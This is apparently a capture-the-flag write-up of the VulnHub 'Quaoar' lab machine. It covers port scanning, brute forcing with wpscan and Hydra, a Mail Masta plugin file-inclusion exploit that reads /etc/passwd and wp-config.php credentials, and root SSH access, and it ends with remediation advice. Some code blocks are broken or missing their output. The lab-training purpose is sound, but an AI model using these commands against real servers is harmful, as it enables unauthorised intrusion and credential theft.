# VulnHub: Quaoar

Feeling a bit rusty on my pentesting skills, I decided to toy around with some vulnerable machines. Quaoar, found on VulnHub, seemed like a good candidate to spend a couple of hours on.

# 1. Determine Services
The first step is to determine what the purpose of the host is. We use nmap to conduct a port scan and attempt to identify the operating system and service versions:

```
# nmap -sS -sV -p- -O -oN nmap.txt 192.168.1.25

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-12 19:38 PDT
Nmap scan report for 192.168.1.25
Host is up (0.00029s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d

```

The server has a wide attack surface as it is configured with quite a few services; DNS, mail, Samba, SSH, and a web server.

Mail software is reknown for vulnerabilities, so Dovecot is a candidate.

We are also running Samba, which presents additional attacks, often related to misconfigurations. For example, open shares, and not limiting authentication attempts.

It appears that we are dealing with a mail server. Possibly a web server as well.

# 2. Service Enumeration

## DNS Enumeration
While there are [vulnerabilties](https://www.cvedetails.com/vulnerability-list/vendor_id-64/product_id-144/version_id-111391/ISC-Bind-9.8.1.html) associated with ISC Bind 9.8.1, they are generally denial of service related (with a bypass relating to a Windows server).

## Apache Enumeration
Apache returns the standard 404, leaking version info and OS (Apache/2.2.22 (Ubuntu)).

Wappalyzer shows us that we are running PHP 5.3.10. A quick Nikto scan identifies that there is a WordPress installation located at ```/wordpress```, which is also apparent from browsing to ```robots.txt```.

Using BurpSuite to brute force directories against a DirBuster listing, we also find reference to an ```/upload``` directory.

### LEPTON CMS
Navigating to the ```/upload``` directory, we see that the site is powered by LEPTON, which is a Content Management System (CMS).

Searching for LEPTON vulnerabilities, we find a few possibilities. However, none of them pan out as the majority require authentication and/or running the installation/configuration. It appears that there is a misconfiguration, as Lepton is looking for resources from 192.168.0.190. While DNS poisoning seemed possible, enumeration should be completed to better evaluate our attack surface.

### WordPress
Running ```wpscan``` we find numerous possible vulnerabilities:

```
# wpscan http://192.168.1.25/wordpress

```

While there are numerous vulnerabilities identified, most require authentication.

We can also use wpscan to attempt to brute force credentials for us:
```
wpscan --url http://192.168.1.25/wordpress --wordlist /usr/share/wordlists/rockyou.txt --username admin --threads 20
```

Before we do that though, we should verify that the site is not using multi-factor authentication that would get a brute force attack blocked.

Attempting to login to ```/wordpress/wp-login.php``` we try ```admin:admin``` and score an easy win.

Reviewing the installed plugins, we see that 'Mail Masta' is installed.

# 3. Exploitation

## Local File Inclusion (LFI)
```
Description: Mail Masta is email marketing plugin for Wordpress.
```

Since WordPress plugins are often less secure than WordPress core, and it is essentially the only plugin that was installed (Akismet is part of the default configuration, so does not really count), we search for Mail Masta vulnerabiltiies and find a [Local File Inclusion](https://www.exploit-db.com/exploits/40290/) vulnerability.

This seems promising as it may get us a shell. If not, we can use our admin credentials in WordPress to take care of that bit. Starting with the token LFI test, we try to grab the password file:
```
http://192.168.1.25/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_end.php?pl=/etc/passwd
```


```

Since we are running SSH and we had an easy default with the WordPress admin account, what if ```wpadmin``` is another default?

## Brute Force Authentication

With SMB running, we can also attempt to brute force credentials. This is a noisy approach, and really could be attempted against SSH as well. For Hydra, we configure our attack:

  -L = User list
  -P = Password list
  -e = Extra password checks:
      n = NULL password check, 
      s = Try username as password,
      r = Reverse username
  -t = Threads

```
# hydra -L users.txt -P /opt/betterdefaultpasslist/ssh.txt -e nsr -t 16 192.168.1.25 smb

# 5. Post-Exploitation

## Privilege Escalation

Using shell or LFI, we can examine the WordPress configuration file and get access to MySQL:

```
# curl -s --url http://192.168.1.25/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/read=convert.base64-encode/resource=/var/www/wordpress/wp-config.php | base64 -d
<?php
/**
 * The base configurations of the WordPress.
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
...
```

Well that is too tempting not to try:

```
# ssh root@192.168.1.25
root@192.168.1.25's password:

Weak passwords... You don't find that in CTFs.

## Process Enumeration

Easy defaults get us two out of three flags. Where is the third? Tucked away in a standard enumeration location:
```
root@Quaoar:~# cat /etc/cron.d/php5
# /etc/cron.d/php5: crontab fragment for php5
#  This purges session files older than X, where X is defined in seconds
#  as the largest value of session.gc_maxlifetime from all your php.ini
#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
root@Quaoar:~# 
```

# 6. Conclusion

## False Flag
Looking at the two known files, we see that they have a length of 32. Searching for files that are 33 bytes in length, we find quite a few. A little bash-fu identifies what we think are the three flags:

```
# find / -type f -size 33c 2>/dev/null | xargs cat | grep -v " " | grep -o -w '\w\{32,32\}'
8e3f9ec016e3598c5eec11fd3d73f6fb
184b159199b5f40556a078e40000012c
2bafe61f03117ac66a73c3c514de796e
```

Until we realize that the third flag is really just the machine-id and it represents a false positive. This forced us to continue proper enumeration during the post-exploitation phase and rewarded our systematic persistence.

## Difficulty
The VM was advertised as very easy and certainly lived up to the rating. It was easy, but it also included some interesting paths to promote investigation and research.

## Remediation
It appears that the server was initially going to be a CMS using LEPTON, and configured to use a local mail server. 

WordPress and the Masta Mail plugin appear to have replaced this approach. The unused applicatoins were not purged, which increases the attack surface of the server.

Additionally, running outdated versions of software (WordPress) and supporting compoents (Masta Mail) left the system vulnerable to an unauthenticated attack. When combined with weak and easily guessed passwords, Quaoar was easily uprooted.
